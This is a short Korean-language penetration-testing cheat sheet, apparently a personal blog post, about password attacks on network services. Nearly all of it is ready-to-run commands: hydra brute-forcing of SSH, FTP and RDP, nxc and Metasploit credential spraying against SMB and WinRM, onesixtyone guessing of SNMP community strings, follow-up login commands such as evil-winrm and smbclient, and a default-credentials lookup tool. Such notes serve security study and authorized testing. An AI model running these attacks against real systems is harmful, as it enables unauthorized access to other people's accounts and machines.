---
title: "Network services password attack (ssh, ftp, smb ..)"
date: 2025-02-22
categories: [cheatsheet]
tags: [password]
---

> 여러 네트워크 서비스 패스워드 공격 방법.

## SSH
```
# 공격 (-t: 동시 스레드 수)
hydra -L users.txt -P passwords.txt -t 4 ssh://<target_ip>

# 인증
ssh user@<target_ip> 후 패스워드 입력
```

## FTP
```
# 공격
hydra -L users.txt -P passwords.txt -t 4 ftp://<target_ip>

# 인증
ftp <target_ip> 후 유저이름, 패스워드 입력
```

## SMB
```
# 공격 (nxc)
nxc smb <target_ip> -u users.txt -p passwords.txt --shares

# 공격 (metasploit)
> use auxiliary/scanner/smb/smb_login
> set user_file, pass_file, rhosts
> run

(hydra도 가능)

# 인증
smbclient -L //<target_ip> -U 'user%pass'
smbclient -U 'user%pass' //<target_ip>/<share>
```

## RDP
```
# 공격
hydra -L users.txt -P passwords.txt -t 4 rdp://<target_ip>

# 인증
xfreerdp3 /v:<target_ip> /u:user /p:pass
```

## WinRM
```
# 공격 (nxc)
nxc winrm <target_ip> -u users.txt -p passwords.txt -t 4

# 인증
evil-winrm -i <target_ip> -u user -p password
```

## SNMP
```
# 공격 (community string)
onesixtyone -c community.list <target_ip>

# 인증
snmpwalk -v2c -c <string> <target_ip>
```

## Default Password

기본 비밀번호 검색 도구

https://github.com/ihebski/DefaultCreds-cheat-sheet
```
pipx install defaultcreds-cheat-sheet

➤ creds search tomcat
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat (web)              |   tomcat   |   tomcat   |
| apache tomcat (web)              |   admin    |   admin    |
...
+----------------------------------+------------+------------+
```